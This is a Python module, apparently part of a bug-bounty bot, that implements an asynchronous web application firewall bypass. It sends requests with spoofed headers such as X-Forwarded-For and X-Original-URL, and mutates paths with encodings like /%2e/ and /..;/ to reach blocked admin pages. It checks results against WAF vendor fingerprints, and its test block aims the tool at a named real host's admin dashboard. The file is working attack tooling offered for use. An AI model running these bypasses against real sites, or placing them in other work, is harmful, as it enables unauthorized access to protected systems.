import asyncio
import aiohttp
import logging
from urllib.parse import urlparse, urljoin
from typing import List, Dict, Optional
from core.config import Config

logger = logging.getLogger("BugBot.WAF_Bypass")

class DynamicWAFBypass:
    """
    Fase 10: Bypasses Dinámicos de WAF (Spoofing & Path Mutation).
    Usa el Modelo "Francotirador Asíncrono" pedido por el Comandante:
    Jamás inyectadas todas a la vez (evita anomalías de tamaño de cabecera).
    Una sola técnica de bypass, por cada petición clonada de manera asíncrona.
    """

    # Diccionario Base de Spoofing (Engaño de Origen)
    SPOOF_HEADERS = [
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"}
    ]

    # Diccionario de Mutaciones de Rutas Evasivas
    # Asume que intentamos llegar a /admin o rutas baneadas.
    PATH_MUTATIONS = [
        "/%2e/",        # /./
        "/%ef%bc%8f",   # Unicode trick for slash
        "/%20/",        # Space trick
        "/./",
        "//",
        "/..;/",
        "/%09/",
        "/%0a/",
        "/%00/"
    ]

    def __init__(self, concurrency: int = 5):
        # Mantenemos hilos controlados. Un WAF ya está enojado (403), no queremos bombardear.
        self.semaphore = asyncio.Semaphore(concurrency)
        self.timeout = aiohttp.ClientTimeout(total=8)

    async def _shoot_single_technique(self, session: aiohttp.ClientSession, url: str, technique_type: str, custom_headers: dict = {}, mutated_url: str = None, original_status: int = 403) -> Optional[Dict]:
        """Dispara una y solo una bala. Aislando la técnica exacta para la PoC."""
        target_url = mutated_url if mutated_url else url
        
        # Mezclar las cabeceras base del bot con la única cabecera maliciosa actual
        headers = Config.CUSTOM_HEADERS.copy()
        headers["User-Agent"] = Config.get_random_user_agent()
        headers.update(custom_headers)
        
        async with self.semaphore:
            # Rate limit: Espaciar peticiones para evitar ban por ráfaga de IP
            await asyncio.sleep(0.5)
            try:
                async with session.get(target_url, headers=headers, timeout=self.timeout, allow_redirects=False) as response:
                    status = response.status
                    
                    # Ban detectado: Backoff inmediato para evitar escalada
                    if status == 429:
                        logger.warning(f"[Sniper] Rate Limit (429) en {target_url}. Pausando 5s.")
                        await asyncio.sleep(5)
                        return None
                    
                    # Ha habido un bypass si el Firewall nos bloqueaba (403/401) y ahora pasamos al backend.
                    is_bypassed = False
                    bypass_msg = "Acceso Directo (200 OK)"
                    
                    if status in [200, 301, 302]:
                        is_bypassed = True
                    elif original_status == 403 and status == 401:
                        # 🎯 El WAF (403) se ha quitado del medio y ahora el backend pide Auth (401). ¡BOMBA!
                        is_bypassed = True
                        bypass_msg = "Bypass L7 Confirmado: Backend alcanzado (WAF evadido)"

                    if is_bypassed:
                        body = await response.text(errors='ignore')
                        
                        # 🕵️‍♂️ Filtro Francotirador: Huellas de "Falso Bypass" (WAF oculto tras un 200 OK)
                        waf_fingerprints = [
                            "cloudflare", "attention required", "captcha-delivery", 
                            "sucuri", "waf", "access denied", "incident id", 
                            "akamai", "perimeterx", "imperva", "incapsula", "mod_security"
                        ]
                        
                        is_false_positive = any(f in body.lower() for f in waf_fingerprints)
                        
                        if not is_false_positive and len(body) > 150:
                            return {
                                "tipo_evasion": technique_type,
                                "url_mutada": target_url,
                                "headers_inyectados": custom_headers,
                                "status_obtenido": status,
                                "detalles": f"{bypass_msg} | Longitud: {len(body)} bytes"
                            }
            except Exception:
                pass
        return None

    async def sniper_bypass(self, blocked_url: str, original_status: int = 403) -> Optional[Dict]:
        """
        Toma una URL que devolvió 403 o 401.
        Clona N peticiones y las dispara concurretemente, asegurando que solo haya 1 inyección por request.
        """
        tasks = []
        parsed = urlparse(blocked_url)
        path = parsed.path if parsed.path else "/"
        base_domain = f"{parsed.scheme}://{parsed.netloc}"

        connector = Config.get_connector()
        async with aiohttp.ClientSession(connector=connector) as session:
            # 1. Armar Tareas de "Header Spoofing"
            for spoof in self.SPOOF_HEADERS:
                tasks.append(
                    self._shoot_single_technique(
                        session=session,
                        url=blocked_url,
                        technique_type="HEADER_SPOOFING",
                        custom_headers=spoof,
                        original_status=original_status
                    )
                )

            # 2. Armar Tareas de "Path Mutation"
            # Si la ruta es /api/admin, inyectamos las mutaciones de slash
            if path != "/":
                for mut in self.PATH_MUTATIONS:
                    # Reemplazamos la primera barra por la técnica de evasión (/api/admin -> /%2e/api/admin)
                    mutated_path = mut + path.lstrip("/")
                    mut_url = urljoin(base_domain, mutated_path)
                    tasks.append(
                        self._shoot_single_technique(
                            session=session,
                            url=blocked_url,
                            technique_type="PATH_MUTATION",
                            mutated_url=mut_url,
                            original_status=original_status
                        )
                    )

            # 3. Disparar el francotirador de forma paralela asíncrona pero pacífica (controlado por Semaphore)
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # 4. Aislar el vector de éxito exacto para la PoC perfecta
            successes = [r for r in results if r is not None and not isinstance(r, Exception)]

            if successes:
                # Retornamos el primer bypass exitoso encontrado (Podríamos reportar todos, pero con 1 basta para romper el WAF)
                winning_poc = successes[0]
                logger.warning(f"\n[🔥] WAF BYPASSED! {blocked_url} -> Técnica L7 de Éxito: {winning_poc}")
                return winning_poc

        return None

# Prueba rápida desde consola
if __name__ == "__main__":
    async def test():
        # Simulamos un objetivo bloqueado
        target = "https://admin.playtika.com/dashboard"
        print(f"[*] WAF Francotirador iniciado frente a {target}")
        bypass = DynamicWAFBypass(concurrency=3)
        res = await bypass.sniper_bypass(target)
        if res:
            print("Resultado de Impacto:", res)
        else:
            print("El muro WAF sigue intacto.")
    asyncio.run(test())
